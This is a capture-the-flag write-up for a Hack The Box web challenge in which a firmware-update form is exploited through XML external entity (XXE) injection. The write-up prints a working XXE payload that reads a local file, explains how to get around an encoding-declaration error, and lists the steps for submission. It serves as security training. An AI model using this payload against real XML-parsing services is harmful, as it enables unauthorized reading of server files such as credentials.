# HTB — Jailbreak (Web)

<img src='pipboy.png' width=500>
## Scenario

The crew obtains an experimental Pip-Boy and attempts to bypass its security through a firmware update. The challenge involves analyzing the firmware-update functionality and exploiting insecure XML processing to retrieve a protected file.

## 1. Understanding the Vulnerability

The firmware-update feature accepts XML input. If the XML parser allows external entity resolution, an attacker may define an entity that references a local file on the server.

The target file specified in the challenge is:

```text
/flag.txt
```

## 2. Crafting the XXE Payload

I created a custom XML document with a `DOCTYPE` declaration and an external entity pointing to the target file.

```xml
<!DOCTYPE FirmwareUpdateConfig [
    <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

**Important:** I removed the XML encoding declaration after the application returned this error:

```text
Unicode strings with encoding declaration are not supported.
Please use bytes input or XML fragments without declaration.
```

Removing `<?xml version="1.0" encoding="UTF-8"?>` allowed the XML input to be processed.

## 3. Submitting the Payload

1. Open the running Jailbreak challenge.
2. Locate the firmware-update XML input.
3. Replace the existing XML with the modified payload.
4. Submit the firmware update.
5. Inspect the response for the resolved entity value.

## The application returns the flag in the firmware-version message



